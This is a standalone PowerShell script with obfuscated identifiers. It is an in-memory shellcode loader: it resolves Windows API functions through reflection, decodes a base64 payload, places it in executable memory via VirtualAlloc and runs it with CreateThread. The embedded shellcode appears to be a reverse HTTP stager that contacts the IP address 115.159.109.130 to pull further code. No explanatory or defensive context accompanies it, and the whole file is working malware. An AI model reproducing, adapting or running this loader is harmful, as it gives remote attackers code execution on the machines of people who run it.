function tP56 {
	Param ($k8gWLR9R, $oP258S)		
	$m_T = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $m_T.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($m_T.GetMethod('GetModuleHandle')).Invoke($null, @($k8gWLR9R)))), $oP258S))
}

function fSk5IXK {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $jjotyqLKKQaP,
		[Parameter(Position = 1)] [Type] $ySZ = [Void]
	)
	
	$sm375GSC = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sm375GSC.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jjotyqLKKQaP).SetImplementationFlags('Runtime, Managed')
	$sm375GSC.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ySZ, $jjotyqLKKQaP).SetImplementationFlags('Runtime, Managed')
	
	return $sm375GSC.CreateType()
}

[Byte[]]$ebPAzdZVSH2 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1obmV0AGh3aW5pVGhMdyYH/9Ux21NTU1NTaDpWeaf/1VNTagNTU2iQHwAA6KEAAAAvVmxGb3Q4NEpZcF81c19peW9DOFYzd09TRHYtS2loN3ZGd0FwAFBoV4mfxv/VicZTaAACYIRTU1NXU1Zo61UuO//VlmoKX1NTU1NWaC0GGHv/1YXAdRRoiBMAAGhE8DXg/9VPdeHoTAAAAGpAaAAQAABoAABAAFNoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTPiwcBw4XAdeVYw1/of////zExNS4xNTkuMTA5LjEzMAC78LWiVmoAU//V")
		
$x7vcoqku2gi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tP56 kernel32.dll VirtualAlloc), (fSk5IXK @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ebPAzdZVSH2.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($ebPAzdZVSH2, 0, $x7vcoqku2gi, $ebPAzdZVSH2.length)

$cye37iRwIOZZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tP56 kernel32.dll CreateThread), (fSk5IXK @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$x7vcoqku2gi,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tP56 kernel32.dll WaitForSingleObject), (fSk5IXK @([IntPtr], [Int32]))).Invoke($cye37iRwIOZZ,0xffffffff) | Out-Null
